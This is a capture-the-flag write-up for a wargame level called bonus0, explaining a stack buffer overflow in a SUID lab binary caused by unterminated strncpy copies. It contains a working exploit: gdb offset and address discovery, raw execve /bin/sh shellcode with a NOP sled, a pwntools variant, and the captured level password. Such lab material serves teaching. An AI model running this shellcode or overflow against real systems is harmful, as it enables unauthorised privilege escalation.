# Bonus 0

SUID **bonus1**. NX off (`readelf -l` → `GNU_STACK` is `RWE`), so injected shellcode runs.

## Solution

**1. Find the offset** (send a cyclic pattern as input 2, `sleep` between the two inputs so they land in two separate `read()` calls):

```bash
$ (python -c 'print "0"*20'; sleep 0.3; python -c 'print "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab"'; sleep 0.3) | gdb -q -batch -ex run -ex 'p/x $eip' ./bonus0
0x41336141 in ?? ()
```

`0x41336141` = `"Aa3A"` → offset **9**.

**2. Find `buffer`'s address** (must be measured in the same terminal you'll run the exploit from, it changes with the environment):

```
gdb ./bonus0
(gdb) b read
(gdb) run
(gdb) x/wx $esp+8
0xbfffe674:     0xbfffe680
```

Get the target address (buffer + 60, landing inside the sled) in the same gdb session instead of doing the math by hand:

```
(gdb) p/x *(int*)($esp+8) + 60
$1 = 0xbfffe6bc
(gdb) q
A debugging session is active.
        Inferior 1 [process ...] will be killed. now what? y
```
(`y` confirms killing the process, gdb doesn't disconnect on its own; there is no `exit` command)

Turn that address into little-endian bytes (gdb can't do this part, it's not reading memory, it's re-encoding a number):

```bash
$ python -c 'addr = 0xbfffe6bc; print "\\x%02x\\x%02x\\x%02x\\x%02x" % (addr&0xff,(addr>>8)&0xff,(addr>>16)&0xff,(addr>>24)&0xff)'
\xbc\xe6\xff\xbf
```

**3. Run it** (100-byte NOP sled + shellcode as input 1, `9 pad + target + 7 filler` as input 2):

```bash
$ (python -c 'print "\x90"*100 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'; python -c 'print "A"*9 + "\xbc\xe6\xff\xbf" + "B"*7'; cat) | ./bonus0
id
uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

**If it segfaults**: your `buffer` address is different (different terminal = different environment). Redo step 2 in the exact terminal you're running from, then rebuild step 3 with the new bytes.

Flag: `cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`

## Why this works

```c
void p(char *dest, char *prompt) {
    char buffer[4096];
    read(0, buffer, 0x1000);
    *strchr(buffer, '\n') = '\0';
    strncpy(dest, buffer, 20);        // no terminator at exactly 20 bytes
}
void pp(char *out) {
    char a[20], b[20];
    p(a, " - "); p(b, " - ");
    strcpy(out, a);                   // a has no terminator -> reads into b -> ...
    out[strlen(out)] = ' ';
    strcat(out, b);                   // ...and on past out, into main's return address
}
int main(void) { char buf[42]; pp(buf); puts(buf); }
```

Two 20-byte inputs with no null terminator run together and overflow `main`'s 42-byte `buf`. `a` and `b` are too small for shellcode, so it hides in `p`'s own 4096-byte `buffer` instead: input 1 fills `buffer` with a NOP sled + shellcode (the first 20 bytes get copied to `a`, harmless), input 2 only overwrites `buffer`'s first 20 bytes, so the sled survives at the same address for the second call. The offset-9 return address overwrite points into the sled (not the shellcode's exact start, gdb/runtime addresses drift slightly), which slides down into the real shellcode. Shellcode must be null-byte free (`strchr` would stop early on a null and crash before running); the 45-byte one here is the same execve(`/bin/sh`) shellcode used in level9, a shorter 28-byte variant works too, length doesn't matter since `buffer` is huge.

Sending the two inputs as two separate writes (not one) matters: `p()` calls `read()` twice, and `read()` on a pipe returns whatever's currently buffered, it won't wait for more. One combined write lets the first `read()` swallow both inputs.

## Alternative: pwntools

```python
shellcode = asm(shellcraft.sh())
io.sendline(b'\x90' * 100 + shellcode)
io.sendline(b'A' * 9 + p32(0xbfffec6c) + b'B' * 7)
```

`p32()` replaces the little-endian conversion; the two `sendline()`s replace the `sleep`. Doesn't replace gdb for finding the address/offset. `Ressources/exploit.py` runs this for real over SSH (a local copy of the binary has no SUID bit).
